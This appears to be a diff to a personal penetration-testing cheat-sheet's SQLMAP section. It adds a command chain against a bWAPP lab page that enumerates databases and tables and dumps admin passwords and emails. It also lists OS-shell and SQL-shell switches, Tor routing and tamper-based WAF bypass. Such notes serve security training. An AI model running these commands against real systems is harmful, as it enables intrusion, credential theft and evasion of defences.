@@ -72,35 +72,28 @@ IF(0,name,age)
 
 
 ## SQLMAP
-- Commands
-  - ```sqlmap --help```
-  - ```sqlmap -u [target url]```
-  - ```sqlmap -u [target url] --os-shell```
-  - ```sqlmap -u [target url] --sql-shell```
+- Usage
+  - ```sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title```
+    - Define "title" as the test parameter (input string was passed as value of title) 
+  - ``` sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title --dbs```
+    - Get a list of databases present on the database server 
+  - ```sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP --tables``` 
+    - Get a list of tables for database bWAPP
+  - ```sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users --columns``` 
+    - Get the list of columns in the users table of bWAPP database
+  - sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump``` 
+    - Dump password and email for admin from the users table. Press 'n' twice when prompted
 
-- Login page
-```
-sqlmap -u https://admin-portal.htb/login.php --form --dbs
-sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass"
-sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" --dbs
-sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin --tables
-sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin -T users --columns
-sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin -T users --dump
-```
+- Burp & SQLMAP
+  - Intercept request in Burp, Right-click on it and choose "Copy to file"
+  - ```sqlmap -r request -p title```
 
 - Switches
-  - Level: ```--dbs --level 5```
-  - Risk: ```--risk 3```
-  - POST: ```sqlmap -u “http://testfire.net/login.jsp” --form --dbs``` 
-  - Technique: ```techniques=B --dbs```
-    - ```B``` => Blind Boolean
-    - ```T``` => Blind Time-based
-    - ```E``` => Error-based
-    - ```U``` => Union
-  - Tor: ```--tor```
+  - Tor
+    - ```--tor```
   - Shell
-    - ```sqlmap -u “...” --sql-shell```
-    - ```sqlmap -u “...” --os-shell```
+    - ```sqlmap -u "..." --sql-shell```
+    - ```sqlmap -u "..." --os-shell```
   - WAF Bypass 
-    - Path: /usr/share/sqlmap/tamper 
     - ```--tamper=space2dash, hex2char --dbs```
+    - Path: /usr/share/sqlmap/tamper 
